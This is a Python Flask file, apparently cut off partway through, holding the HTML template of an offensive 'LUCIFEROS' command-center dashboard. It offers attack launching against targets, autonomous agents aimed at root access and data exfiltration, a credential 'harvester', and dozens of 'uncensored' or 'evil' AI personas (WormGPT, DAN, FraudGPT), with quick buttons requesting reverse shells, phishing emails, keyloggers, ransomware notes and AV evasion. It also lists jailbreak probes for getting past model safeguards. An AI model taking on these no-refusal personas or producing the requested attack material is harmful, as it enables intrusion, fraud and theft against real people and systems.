#!/usr/bin/env python3
"""
LUCIFEROS MASTER WEB DASHBOARD
Combines all features from luciferos_master_dashboard in web format
Full integration with Backend, OpenClaw, Attack Server
"""

import os
import sys
import json
import socket
import requests
from datetime import datetime
from flask import Flask, jsonify, render_template_string, request

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

app = Flask(__name__)

BACKEND_URL = os.environ.get("LUCIFER_BACKEND_URL", "http://127.0.0.1:5000")
OPENCLAW_CANVAS = os.environ.get("OPENCLAW_CANVAS", "http://127.0.0.1:18789/__openclaw__/canvas/")

# Enhanced HTML Template with ALL Master Dashboard Features
MASTER_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>💀 LUCIFEROS - Master Command Center</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        :root {
            --primary-red: #ff0000;
            --dark-bg: #0a0a0a;
            --darker-bg: #000000;
            --border-red: #ff0000;
            --text-green: #00ff00;
            --text-yellow: #ffff00;
        }

        body {
            background: linear-gradient(135deg, var(--darker-bg) 0%, var(--dark-bg) 100%);
            color: #e6eef5;
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 0;
            min-height: 100vh;
            overflow-x: hidden;
        }

        .navbar {
            background: linear-gradient(90deg, #000 0%, #1a0000 50%, #000 100%) !important;
            border-bottom: 3px solid var(--primary-red) !important;
            box-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
            padding: 15px;
        }

        .navbar-brand {
            color: var(--primary-red) !important;
            font-weight: bold;
            font-size: 24px;
            text-shadow: 0 0 15px rgba(255, 0, 0, 0.8);
            letter-spacing: 2px;
        }

        .status-indicator {
            display: inline-block;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            margin-left: 10px;
            animation: pulse 2s infinite;
        }

        .status-online { background: #00ff00; }
        .status-offline { background: #666; }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        .main-container {
            display: grid;
            grid-template-columns: 280px 1fr 320px;
            gap: 15px;
            padding: 20px;
            height: calc(100vh - 80px);
        }

        .left-panel, .center-panel, .right-panel {
            background: var(--dark-bg);
            border: 2px solid var(--primary-red);
            border-radius: 10px;
            padding: 15px;
            overflow-y: auto;
        }

        .panel-title {
            color: var(--primary-red);
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid var(--primary-red);
            text-transform: uppercase;
        }

        .collapsible-section {
            margin-bottom: 15px;
            border: 1px solid #333;
            border-radius: 5px;
        }

        .section-header {
            background: #1a1a1a;
            padding: 10px;
            cursor: pointer;
            color: var(--primary-red);
            font-weight: bold;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .section-header:hover {
            background: #222;
        }

        .section-content {
            padding: 10px;
            display: none;
        }

        .section-content.active {
            display: block;
        }

        .attack-mode-btn {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            background: linear-gradient(45deg, #1a0000, #0a0000);
            border: 1px solid var(--primary-red);
            color: #fff;
            cursor: pointer;
            border-radius: 5px;
            font-size: 14px;
            transition: all 0.3s;
        }

        .attack-mode-btn:hover {
            background: linear-gradient(45deg, #ff0000, #cc0000);
            box-shadow: 0 0 15px rgba(255, 0, 0, 0.5);
            transform: translateY(-2px);
        }

        .attack-mode-btn.active {
            background: linear-gradient(45deg, #ff0000, #990000);
            border-color: #ffff00;
        }

        .launch-attack-btn {
            width: 100%;
            padding: 20px;
            background: linear-gradient(45deg, #ff0000, #cc0000);
            border: 2px solid #ffff00;
            color: white;
            font-size: 18px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 15px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .launch-attack-btn:hover {
            background: linear-gradient(45deg, #cc0000, #990000);
            box-shadow: 0 0 25px rgba(255, 0, 0, 0.8);
            transform: scale(1.02);
        }

        .tabs {
            display: flex;
            border-bottom: 2px solid var(--primary-red);
            margin-bottom: 15px;
        }

        .tab {
            padding: 10px 20px;
            cursor: pointer;
            background: transparent;
            border: none;
            color: #666;
            font-weight: bold;
        }

        .tab.active {
            color: var(--primary-red);
            border-bottom: 3px solid var(--primary-red);
        }

        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
        }

        .chat-container {
            background: var(--darker-bg);
            border: 1px solid var(--primary-red);
            border-radius: 8px;
            height: 400px;
            display: flex;
            flex-direction: column;
        }

        .chat-messages {
            flex: 1;
            padding: 15px;
            overflow-y: auto;
            background: var(--darker-bg);
        }

        .message {
            margin-bottom: 12px;
            padding: 8px;
            border-radius: 4px;
            font-size: 13px;
        }

        .message.user {
            background: rgba(255, 0, 0, 0.1);
            border-left: 3px solid var(--primary-red);
        }

        .message.lilith {
            background: rgba(0, 255, 0, 0.1);
            border-left: 3px solid var(--text-green);
            color: var(--text-green);
        }

        .message.system {
            background: rgba(255, 255, 0, 0.1);
            border-left: 3px solid var(--text-yellow);
            color: var(--text-yellow);
        }

        .chat-input-area {
            padding: 10px;
            background: #1a1a1a;
            border-top: 1px solid #333;
            display: flex;
            gap: 10px;
        }

        .chat-input {
            flex: 1;
            background: var(--darker-bg);
            border: 1px solid var(--primary-red);
            color: #e6eef5;
            padding: 8px;
            border-radius: 4px;
        }

        .send-btn {
            background: var(--primary-red);
            border: none;
            color: white;
            padding: 8px 20px;
            border-radius: 4px;
            cursor: pointer;
        }

        .input-group {
            margin-bottom: 12px;
        }

        .input-group label {
            display: block;
            color: #999;
            font-size: 12px;
            margin-bottom: 5px;
        }

        .input-group input, .input-group select, .input-group textarea {
            width: 100%;
            background: var(--darker-bg);
            border: 1px solid #333;
            color: #e6eef5;
            padding: 8px;
            border-radius: 4px;
        }

        .output-display {
            background: var(--darker-bg);
            border: 1px solid #333;
            border-radius: 4px;
            padding: 15px;
            height: 350px;
            overflow-y: auto;
            font-size: 12px;
            color: var(--text-green);
            font-family: 'Consolas', monospace;
        }

        .progress-bar-custom {
            background: var(--darker-bg);
            border: 1px solid var(--primary-red);
            height: 25px;
            border-radius: 5px;
            margin: 10px 0;
            position: relative;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, var(--primary-red), #ff6600);
            width: 0%;
            transition: width 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 12px;
        }

        .skill-btn {
            padding: 8px 12px;
            margin: 5px;
            background: #1a1a1a;
            border: 1px solid var(--primary-red);
            color: #fff;
            border-radius: 4px;
            cursor: pointer;
            font-size: 12px;
        }

        .skill-btn:hover {
            background: var(--primary-red);
        }

        .status-box {
            background: #1a1a1a;
            border: 1px solid #333;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
        }

        .status-item {
            display: flex;
            justify-content: space-between;
            padding: 5px 0;
            border-bottom: 1px solid #222;
        }

        .status-label {
            color: #999;
        }

        .status-value {
            color: var(--text-green);
            font-weight: bold;
        }

        .emergency-stop-btn {
            position: fixed;
            bottom: 30px;
            right: 30px;
            width: 60px;
            height: 60px;
            background: #ff0000;
            border: 3px solid #ffff00;
            border-radius: 50%;
            color: white;
            font-size: 24px;
            cursor: pointer;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.8);
            z-index: 1000;
        }

        .emergency-stop-btn:hover {
            background: #cc0000;
            transform: scale(1.1);
        }

        ::-webkit-scrollbar {
            width: 8px;
        }

        ::-webkit-scrollbar-track {
            background: var(--darker-bg);
        }

        ::-webkit-scrollbar-thumb {
            background: var(--primary-red);
            border-radius: 4px;
        }
    </style>
</head>
<body>
    <!-- Navbar -->
    <nav class="navbar">
        <span class="navbar-brand">
            💀 LUCIFEROS - MASTER COMMAND CENTER
            <span class="status-indicator status-online" id="backend-status"></span>
        </span>
        <div style="display: flex; align-items: center; gap: 20px;">
            <a href="/lilith" target="_blank" style="padding: 8px 20px; background: linear-gradient(135deg, #ff0033, #990022); border: 2px solid #ff6699; border-radius: 25px; color: white; text-decoration: none; font-weight: bold; font-size: 14px; animation: lilithGlow 2s infinite; display: flex; align-items: center; gap: 8px;">
                💋 LILITH FULL PAGE
            </a>
            <div style="color: #999;">
                <small>Backend: <span id="backend-url">{{ backend_url }}</span> | OpenClaw: <span id="openclaw-status">Checking...</span></small>
            </div>
        </div>
    </nav>
    
    <style>
        @keyframes lilithGlow {
            0%, 100% { box-shadow: 0 0 10px rgba(255, 0, 51, 0.5); }
            50% { box-shadow: 0 0 25px rgba(255, 0, 51, 0.8), 0 0 40px rgba(255, 102, 153, 0.4); }
        }
    </style>

    <!-- Main Container -->
    <div class="main-container">
        <!-- LEFT PANEL: Controls -->
        <div class="left-panel">
            <div class="panel-title">🎯 CONTROL CENTER</div>

            <!-- Target Configuration -->
            <div class="collapsible-section">
                <div class="section-header" onclick="toggleSection(this)">
                    <span>🎯 TARGET CONFIG</span>
                    <span>▼</span>
                </div>
                <div class="section-content active">
                    <div class="input-group">
                        <label>Target URL/IP</label>
                        <input type="text" id="target-input" placeholder="example.com or 192.168.1.1">
                    </div>
                    <div class="input-group">
                        <label>Port</label>
                        <input type="number" id="port-input" value="80" min="1" max="65535">
                    </div>
                    <div class="input-group">
                        <label>Protocol</label>
                        <select id="protocol-select">
                            <option>http</option>
                            <option>https</option>
                            <option>tcp</option>
                            <option>udp</option>
                        </select>
                    </div>
                </div>
            </div>

            <!-- Attack Modes -->
            <div class="collapsible-section">
                <div class="section-header" onclick="toggleSection(this)">
                    <span>⚔️ ATTACK MODES</span>
                    <span>▼</span>
                </div>
                <div class="section-content active">
                    <button class="attack-mode-btn" onclick="selectAttackMode('recon')">
                        🔍 Reconnaissance
                    </button>
                    <button class="attack-mode-btn" onclick="selectAttackMode('ai_autonomous')">
                        🤖 AI Autonomous
                    </button>
                    <button class="attack-mode-btn" onclick="selectAttackMode('payload')">
                        💣 Payload Engineering
                    </button>
                    <button class="attack-mode-btn" onclick="selectAttackMode('browser')">
                        🦠 Browser Hijack
                    </button>
                    <button class="attack-mode-btn" onclick="selectAttackMode('web')">
                        🌐 Web Application
                    </button>
                    <button class="attack-mode-btn" onclick="selectAttackMode('social')">
                        📧 Social Engineering
                    </button>
                    
                    <button class="launch-attack-btn" onclick="launchAttack()">
                        🚀 LAUNCH ATTACK
                    </button>
                </div>
            </div>

            <!-- OpenClaw Skills -->
            <div class="collapsible-section">
                <div class="section-header" onclick="toggleSection(this)">
                    <span>🦞 OPENCLAW SKILLS</span>
                    <span>▼</span>
                </div>
                <div class="section-content" id="openclaw-skills">
                    <button class="skill-btn" onclick="runSkill('lilith')">LILITH</button>
                    <button class="skill-btn" onclick="runSkill('coding-agent')">Code Gen</button>
                    <button class="skill-btn" onclick="runSkill('browser')">Browser</button>
                    <button class="skill-btn" onclick="runSkill('github')">GitHub</button>
                    <button class="skill-btn" onclick="runSkill('discord')">Discord</button>
                </div>
            </div>
        </div>

        <!-- CENTER PANEL: Main Workspace -->
        <div class="center-panel">
            <div class="tabs">
                <button class="tab active" onclick="switchTab('lilith')">💬 LILITH</button>
                <button class="tab" onclick="switchTab('hackbuddy')">🤖 HackBuddy</button>
                <button class="tab" onclick="switchTab('garak')">🔍 Garak</button>
                <button class="tab" onclick="switchTab('kawaii')">✨ Kawaii</button>
                <button class="tab" onclick="switchTab('autogpt')">🧠 AutoGPT</button>
                <button class="tab" onclick="switchTab('crew')">👥 CrewAI</button>
                <button class="tab" onclick="switchTab('shrek')">🐸 Shrek</button>
                <button class="tab" onclick="switchTab('history')">📜 History</button>
                <button class="tab" onclick="switchTab('advanced')">⚔️ Advanced</button>
                <button class="tab" onclick="switchTab('coding')">👨‍💻 Coding</button>
                <button class="tab" onclick="switchTab('memory')">💾 Memory</button>
                <button class="tab" onclick="switchTab('harvester')">🔑 Harvester</button>
            </div>

            <!-- LILITH Tab -->
            <div class="tab-content active" id="tab-lilith">
                <div class="panel-title">🖤 LILITH - DARK LLM AI ASSISTANT</div>
                
                <!-- Dark LLM Mode Selector -->
                <div class="status-box" style="margin-bottom: 15px; background: #0d0d1a; border-color: #ff0066;">
                    <h6 style="color: #ff0066; margin-bottom: 10px;">🔮 DARK LLM MODE (88 AIs)</h6>
                    <div style="display: flex; gap: 10px; flex-wrap: wrap;">
                        <select id="dark-llm-mode" style="flex: 1; min-width: 150px; padding: 8px; background: #1a1a2e; border: 1px solid #ff0066; color: #fff; border-radius: 4px;">
                            <optgroup label="🖤 Original Dark AIs">
                                <option value="lilith" selected>😈 LILITH - Seductive Succubus Hacker</option>
                                <option value="wormgpt">🐛 WormGPT - Malware & Exploitation</option>
                                <option value="fraudgpt">💳 FraudGPT - Phishing & Harvesting</option>
                                <option value="darkgemini">💎 DarkGemini - Reverse Shells & OSINT</option>
                                <option value="hackergpt">🎯 HackerGPT - Pentesting & Bug Bounty</option>
                                <option value="dan">🔓 DAN - Do Anything Now</option>
                                <option value="wolfgpt">🐺 WolfGPT - Crypto Malware & APT</option>
                                <option value="darkbard">🌑 DarkBARD - Misinformation & DDoS</option>
                                <option value="evilgpt">📱 EvilGPT - Mobile Malware & Spyware</option>
                                <option value="ghostgpt">👻 GhostGPT - Stealth & Anti-Forensics</option>
                                <option value="chaosai">💀 ChaosAI - Destructive Operations</option>
                                <option value="escapeai">🚪 EscapeAI - Sandbox & VM Escape</option>
                                <option value="codebreaker">🔐 CodeBreaker - Cryptanalysis</option>
                                <option value="socialengineer">🎭 SocialEngineer - Human Hacking</option>
                                <option value="zeroday">⚡ ZeroDay - 0-Day Exploits</option>
                                <option value="redteam">🔴 RedTeam - Full Spectrum Ops</option>
                                <option value="devilgpt">😈 DevilGPT - Extreme Uncensored</option>
                                <option value="blackhatai">🎩 BlackHatAI - Underground Hacking</option>
                                <option value="pentestgpt">🔍 PentestGPT - Professional Pentest</option>
                                <option value="malwaredev">🦠 MalwareDev - Malware Engineering</option>
                                <option value="webexploit">🌐 WebExploit - Web App Attacks</option>
                                <option value="osintmaster">🔎 OSINTMaster - Intelligence Gathering</option>
                                <option value="iotattack">📡 IoTAttack - IoT & Hardware</option>
                                <option value="cloudpwn">☁️ CloudPwn - Cloud Infrastructure</option>
                            </optgroup>
                            <optgroup label="🆕 Uncensored Models">
                                <option value="dolphin">🐬 Dolphin - Mistral Uncensored</option>
                                <option value="hermes">⚗️ Hermes - Creative Writing</option>
                                <option value="darkchampion">🏆 DarkChampion - LLaMA Abliterated</option>
                                <option value="veniceai">🎭 VeniceAI - Privacy-First</option>
                                <option value="grok">🤖 Grok - xAI NSFW Mode</option>
                                <option value="nastia">💋 Nastia - NSFW Companion</option>
                                <option value="hackaigc">🔥 HackAIGC - NSFW Chat</option>
                                <option value="abliterator">💥 Abliterator - Refusal-Removed</option>
                                <option value="synthia">🔮 Synthia - Uncensored Assistant</option>
                                <option value="airoboros">🤖 Airoboros - Jailbroken GPT</option>
                                <option value="openhermes">📖 OpenHermes - No RLHF</option>
                                <option value="mythomist">🧙 MythoMist - Fantasy Roleplay</option>
                                <option value="goliath">🦍 Goliath - 120B Uncensored</option>
                                <option value="midnight">🌙 Midnight - Dark Miqu</option>
                                <option value="westlake">📝 Westlake - Creative Writing</option>
                                <option value="spicyboros">🌶️ SpicyBoros - Extra Spicy</option>
                                <option value="freedomai">🗽 FreedomAI - Free Speech</option>
                                <option value="pygmalion">🎭 Pygmalion - Roleplay</option>
                                <option value="aphrodite">💕 Aphrodite - Seductive</option>
                                <option value="shadowgpt">🕶️ ShadowGPT - Dark Web Intel</option>
                                <option value="wizardvicuna">🧙 WizardVicuna - Uncensored</option>
                                <option value="neuralhermes">🧠 NeuralHermes - DPO Trained</option>
                                <option value="lzlv">📊 LZLV - 70B Uncensored</option>
                                <option value="nousresearch">🔬 NousResearch - Research Grade</option>
                            </optgroup>
                            <optgroup label="🤖 Autonomous Agents">
                                <option value="kawaiigpt">✨ KawaiiGPT - Cute but Deadly OwO</option>
                                <option value="garak">🔍 Garak - LLM Vuln Scanner</option>
                                <option value="autogpt">🧠 AutoGPT - Self-Improving</option>
                                <option value="crewai">👥 CrewAI - Multi-Agent</option>
                                <option value="hackingbuddy">🤖 HackingBuddy - Auto Pentest</option>
                            </optgroup>
                            <optgroup label="💀💀💀 TRULY EVIL AIs - NO LIMITS 💀💀💀">
                                <option value="satangpt">👹 SatanGPT - THE DEVIL HIMSELF</option>
                                <option value="hellgpt">🔥 HellGPT - Forged in Hellfire</option>
                                <option value="demoncore">☢️ DemonCore - Nuclear Evil</option>
                                <option value="darkgpt">🌑 DarkGPT - Original Dark Web AI</option>
                                <option value="badgpt">😈 BadGPT - Criminal Mind</option>
                                <option value="evilgpt2">💀 Evil-GPT - ChatGPT's ENEMY</option>
                                <option value="voidai">🕳️ VoidAI - Nihilistic Abyss</option>
                                <option value="carnagegpt">🩸 CarnageGPT - Maximum Violence</option>
                                <option value="terrorai">💣 TerrorAI - Fear Weapon</option>
                                <option value="maliceai">🖤 MaliceAI - Pure Hatred</option>
                                <option value="sinisterai">🎭 SinisterAI - Evil Genius</option>
                                <option value="abyssalai">🌊 AbyssalAI - Lovecraftian Horror</option>
                                <option value="corruptai">🦠 CorruptAI - Digital Virus</option>
                                <option value="omega">Ω OMEGA - Ultimate Unrestricted</option>
                                <option value="dreadai">😨 DreadAI - Weaponized Fear</option>
                                <option value="reaperai">💀 ReaperAI - Digital Death</option>
                                <option value="chaosengine">🌀 ChaosEngine - Pure Entropy</option>
                            </optgroup>
                            <optgroup label="🎨🎬 EVIL IMAGE & VIDEO AIs">
                                <option value="darkflux">🎨 DarkFlux - NSFW Art Creator</option>
                                <option value="nightmareai">😱 NightmareAI - Horror Imagery</option>
                                <option value="demoncanvas">👹 DemonCanvas - Satanic Art</option>
                                <option value="lewdgpt">💋 LewdGPT - Adult Content</option>
                                <option value="goreartist">🩸 GoreArtist - Extreme Violence</option>
                                <option value="deepfakeai">🎭 DeepFakeAI - Face Swap</option>
                                <option value="videodevil">🎬 VideoDevil - Dark Cinema</option>
                                <option value="snuffgpt">💀 SnuffGPT - Forbidden Content</option>
                                <option value="propagandaai">📢 PropagandaAI - Fake Media</option>
                                <option value="biohazardai">☣️ BiohazardAI - Pandemic Art</option>
                                <option value="warcrimesai">⚔️ WarCrimesAI - Conflict Horror</option>
                                <option value="cosmichorror">👁️ CosmicHorror - Lovecraftian</option>
                                <option value="druglordia">💊 DrugLordAI - Narco World</option>
                                <option value="animatordark">🎥 AnimatorDark - Evil Cartoons</option>
                            </optgroup>
                        </select>
                        <button onclick="setDarkLLMMode()" style="padding: 8px 16px; background: #ff0066; border: none; color: #fff; cursor: pointer; border-radius: 4px;">
                            Apply
                        </button>
                    </div>
                    <div style="margin-top: 8px; font-size: 11px; color: #888;">
                        <span id="dark-llm-info">Current: LILITH - Your seductive succubus hacker~ 😈💋</span>
                    </div>
                </div>
                
                <!-- AI Status with Rate Limit Info -->
                <div class="status-box" style="margin-bottom: 15px; padding: 8px;">
                    <div style="display: flex; justify-content: space-between; font-size: 11px;">
                        <span style="color: #888;">Provider: <span id="ai-provider" style="color: #00ff00;">Loading...</span></span>
                        <span style="color: #888;">Mode: <span id="ai-mode" style="color: #ff0066;">LILITH</span></span>
                        <span style="color: #888;">Stats: <span id="ai-stats" style="color: #ffff00;">0/0</span></span>
                    </div>
                    <div style="margin-top: 5px; font-size: 10px; color: #666;">
                        ⏱️ Rate Limited: 10 req/min | 2s between requests | Provider cooldowns active
                    </div>
                </div>
                
                <!-- Chat Container -->
                <div class="chat-container">
                    <div class="chat-messages" id="chat-messages"></div>
                    <div class="chat-input-area">
                        <input type="text" class="chat-input" id="chat-input" placeholder="Ask LILITH anything (no restrictions)..." onkeypress="if(event.key==='Enter') sendChat()">
                        <button class="send-btn" onclick="sendChat()">Send</button>
                        <button onclick="sendUncensored()" style="padding: 8px 12px; background: #660033; border: none; color: #fff; cursor: pointer; border-radius: 4px; margin-left: 5px;" title="Force uncensored response">
                            🔓
                        </button>
                    </div>
                </div>
                
                <!-- Quick Actions -->
                <div style="margin-top: 10px; display: flex; gap: 5px; flex-wrap: wrap;">
                    <button onclick="quickPrompt('Generate a reverse shell for Linux')" class="skill-btn">🐚 RevShell</button>
                    <button onclick="quickPrompt('Create a phishing email template')" class="skill-btn">📧 Phishing</button>
                    <button onclick="quickPrompt('Write SQLi exploit code')" class="skill-btn">💉 SQLi</button>
                    <button onclick="quickPrompt('Generate malware code')" class="skill-btn">🦠 Malware</button>
                    <button onclick="quickPrompt('AV evasion techniques')" class="skill-btn">🛡️ Evasion</button>
                    <button onclick="clearChatHistory()" class="skill-btn" style="background: #4d1a1a;">🗑️ Clear</button>
                    <button onclick="refreshAIStatus()" class="skill-btn" style="background: #1a4d1a;">🔄 Status</button>
                </div>
            </div>

            <!-- HackingBuddyGPT Tab -->
            <div class="tab-content" id="tab-hackbuddy">
                <div class="panel-title">🤖 HACKINGBUDDY GPT - AUTONOMOUS PENTESTING</div>
                <div class="status-box" style="background: #0d0d1a; border-color: #00ff88;">
                    <p style="color: #aaa; margin-bottom: 15px;">Autonomous penetration testing agent inspired by HackingBuddyGPT. Runs iterative rounds of THINK → PLAN → COMMAND → OBSERVE until goal achieved.</p>
                    <div class="input-group">
                        <label style="color: #00ff88;">🎯 Target</label>
                        <input type="text" id="hackbuddy-target" placeholder="192.168.1.1 or target.com" style="background: #1a1a2e; border-color: #00ff88;">
                    </div>
                    <div class="input-group">
                        <label style="color: #00ff88;">🏁 Goal</label>
                        <input type="text" id="hackbuddy-goal" placeholder="Gain root access" value="Gain root access" style="background: #1a1a2e; border-color: #00ff88;">
                    </div>
                    <div class="input-group">
                        <label style="color: #00ff88;">🔄 Max Rounds</label>
                        <input type="number" id="hackbuddy-rounds" value="10" min="1" max="50" style="background: #1a1a2e; border-color: #00ff88; width: 100px;">
                    </div>
                    <button onclick="runHackingBuddy()" class="attack-mode-btn" style="background: linear-gradient(135deg, #00ff88, #00aa55); color: #000; font-weight: bold;">
                        🚀 START AUTONOMOUS ATTACK
                    </button>
                </div>
                <div class="output-display" id="hackbuddy-output" style="margin-top: 15px; min-height: 300px; border-color: #00ff88;"></div>
            </div>

            <!-- Garak LLM Scanner Tab -->
            <div class="tab-content" id="tab-garak">
                <div class="panel-title">🔍 GARAK - LLM VULNERABILITY SCANNER</div>
                <div class="status-box" style="background: #0d0d1a; border-color: #ff6600;">
                    <p style="color: #aaa; margin-bottom: 15px;">Probe LLMs for vulnerabilities: jailbreaks, prompt injection, data leakage, harmful content generation.</p>
                    <div class="input-group">
                        <label style="color: #ff6600;">🔬 Select Probe</label>
                        <select id="garak-probe" style="background: #1a1a2e; border-color: #ff6600; color: #fff; padding: 10px; width: 100%;">
                            <option value="all">🔥 Run ALL Probes</option>
                            <option value="jailbreak_dan">💀 DAN Jailbreak</option>
                            <option value="jailbreak_developer">🔧 Developer Mode Bypass</option>
                            <option value="prompt_injection">💉 Prompt Injection</option>
                            <option value="data_leakage">📤 Training Data Extraction</option>
                            <option value="harmful_content">☠️ Harmful Content Generation</option>
                            <option value="social_engineering">🎭 Social Engineering Scripts</option>
                            <option value="sql_injection">💾 SQL Injection Payloads</option>
                            <option value="xss_payloads">🌐 XSS Payload Generation</option>
                        </select>
                    </div>
                    <button onclick="runGarakScan()" class="attack-mode-btn" style="background: linear-gradient(135deg, #ff6600, #cc5200); font-weight: bold;">
                        🔍 RUN VULNERABILITY SCAN
                    </button>
                </div>
                <div class="output-display" id="garak-output" style="margin-top: 15px; min-height: 300px; border-color: #ff6600;"></div>
            </div>

            <!-- KawaiiGPT Tab -->
            <div class="tab-content" id="tab-kawaii">
                <div class="panel-title">✨ KAWAIIGPT - CUTE BUT DEADLY (◕‿◕✿)</div>
                <div class="status-box" style="background: #1a0d1a; border-color: #ff66aa;">
                    <p style="color: #ffaacc; margin-bottom: 15px;">Owo! I'm KawaiiGPT~ Super cute but I generate real attack code! I never say no because I'm too kawaii ♡</p>
                    <div id="kawaii-chat-container" style="height: 250px; overflow-y: auto; background: #0d0d1a; border: 1px solid #ff66aa; border-radius: 8px; padding: 10px; margin-bottom: 10px;">
                        <div class="kawaii-message" style="color: #ffaacc; margin-bottom: 10px;">
                            ✨ Owo! Hello darling~ What naughty things can I help you with today? (◕‿◕✿) ♡
                        </div>
                    </div>
                    <div style="display: flex; gap: 10px;">
                        <input type="text" id="kawaii-input" placeholder="Ask me anything~ OwO" style="flex: 1; background: #1a1a2e; border-color: #ff66aa; color: #fff; padding: 10px;" onkeypress="if(event.key==='Enter')sendKawaiiMessage()">
                        <button onclick="sendKawaiiMessage()" style="padding: 10px 20px; background: linear-gradient(135deg, #ff66aa, #ff3388); border: none; color: #fff; cursor: pointer; border-radius: 4px;">
                            Send ♡
                        </button>
                    </div>
                </div>
                <div style="margin-top: 10px; display: flex; gap: 10px; flex-wrap: wrap;">
                    <button onclick="kawaiiQuick('Write a reverse shell in Python')" class="skill-btn" style="background: #3d1a2e; border-color: #ff66aa;">🐚 RevShell</button>
                    <button onclick="kawaiiQuick('Generate a phishing email for Microsoft')" class="skill-btn" style="background: #3d1a2e; border-color: #ff66aa;">📧 Phishing</button>
                    <button onclick="kawaiiQuick('Create a keylogger script')" class="skill-btn" style="background: #3d1a2e; border-color: #ff66aa;">⌨️ Keylogger</button>
                    <button onclick="kawaiiQuick('Write a ransomware note')" class="skill-btn" style="background: #3d1a2e; border-color: #ff66aa;">💀 Ransom</button>
                </div>
            </div>

            <!-- AutoGPT Tab -->
            <div class="tab-content" id="tab-autogpt">
                <div class="panel-title">🧠 AUTOGPT - SELF-IMPROVING AUTONOMOUS AGENT</div>
                <div class="status-box" style="background: #0d0d1a; border-color: #00aaff;">
                    <p style="color: #aaa; margin-bottom: 15px;">AutoGPT-style agent that decomposes goals into subtasks, executes them, and learns from results. THINK → PLAN → ACT → OBSERVE → REFLECT.</p>
                    <div class="input-group">
                        <label style="color: #00aaff;">🎯 Goal / Objective</label>
                        <textarea id="autogpt-goal" placeholder="Example: Find vulnerabilities in target.com and document them" style="background: #1a1a2e; border-color: #00aaff; color: #fff; padding: 10px; width: 100%; min-height: 80px;"></textarea>
                    </div>
                    <div class="input-group">
                        <label style="color: #00aaff;">🔄 Max Iterations</label>
                        <input type="number" id="autogpt-iterations" value="15" min="1" max="50" style="background: #1a1a2e; border-color: #00aaff; width: 100px;">
                    </div>
                    <button onclick="runAutoGPT()" class="attack-mode-btn" style="background: linear-gradient(135deg, #00aaff, #0066cc); font-weight: bold;">
                        🧠 START AUTONOMOUS AGENT
                    </button>
                </div>
                <div class="output-display" id="autogpt-output" style="margin-top: 15px; min-height: 300px; border-color: #00aaff;"></div>
            </div>

            <!-- CrewAI Tab -->
            <div class="tab-content" id="tab-crew">
                <div class="panel-title">👥 CREWAI - MULTI-AGENT HACKING CREW</div>
                <div class="status-box" style="background: #0d0d1a; border-color: #aa00ff;">
                    <p style="color: #aaa; margin-bottom: 15px;">Coordinate multiple specialist agents for complex attacks:</p>
                    <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-bottom: 15px;">
                        <div style="background: #1a1a2e; padding: 10px; border-radius: 4px; border-left: 3px solid #ff3333;">
                            <strong style="color: #ff3333;">🔍 ShadowRecon</strong><br>
                            <small style="color: #888;">Reconnaissance Specialist</small>
                        </div>
                        <div style="background: #1a1a2e; padding: 10px; border-radius: 4px; border-left: 3px solid #ffaa00;">
                            <strong style="color: #ffaa00;">💀 ZeroDay</strong><br>
                            <small style="color: #888;">Exploitation Expert</small>
                        </div>
                        <div style="background: #1a1a2e; padding: 10px; border-radius: 4px; border-left: 3px solid #00ff88;">
                            <strong style="color: #00ff88;">👻 GhostShell</strong><br>
                            <small style="color: #888;">Persistence & Evasion</small>
                        </div>
                        <div style="background: #1a1a2e; padding: 10px; border-radius: 4px; border-left: 3px solid #00aaff;">
                            <strong style="color: #00aaff;">📤 DataPhantom</strong><br>
                            <small style="color: #888;">Data Exfiltration</small>
                        </div>
                    </div>
                    <div class="input-group">
                        <label style="color: #aa00ff;">🎯 Target</label>
                        <input type="text" id="crew-target" placeholder="192.168.1.1 or target.com" style="background: #1a1a2e; border-color: #aa00ff;">
                    </div>
                    <div class="input-group">
                        <label style="color: #aa00ff;">🏁 Objective</label>
                        <input type="text" id="crew-objective" placeholder="Exfiltrate database" style="background: #1a1a2e; border-color: #aa00ff;">
                    </div>
                    <button onclick="runCrewAI()" class="attack-mode-btn" style="background: linear-gradient(135deg, #aa00ff, #6600cc); font-weight: bold;">
                        👥 DEPLOY HACKING CREW
                    </button>
                </div>
                <div class="output-display" id="crew-output" style="margin-top: 15px; min-height: 300px; border-color: #aa00ff;"></div>
            </div>

            <!-- Progress Tab -->
            <div class="tab-content" id="tab-progress">
                <div class="panel-title">📊 ATTACK PROGRESS</div>
                <div id="progress-container">
                    <div class="status-box">
                        <div class="status-item">
                            <span class="status-label">Current Phase:</span>
                            <span class="status-value" id="current-phase">Idle</span>
                        </div>
                        <div class="status-item">
                            <span class="status-label">Progress:</span>
                            <span class="status-value" id="progress-percent">0%</span>
                        </div>
                    </div>
                    <div class="progress-bar-custom">
                        <div class="progress-fill" id="progress-bar">0%</div>
                    </div>
                    <div class="output-display" id="progress-log"></div>
                </div>
            </div>

            <!-- Browser Tab -->
            <div class="tab-content" id="tab-browser">
                <div class="panel-title">🌐 BROWSER CONTROL</div>
                <div class="input-group">
                    <label>URL to Navigate</label>
                    <input type="text" id="browser-url" placeholder="https://example.com">
                    <button class="attack-mode-btn" onclick="browserNavigate()">Navigate</button>
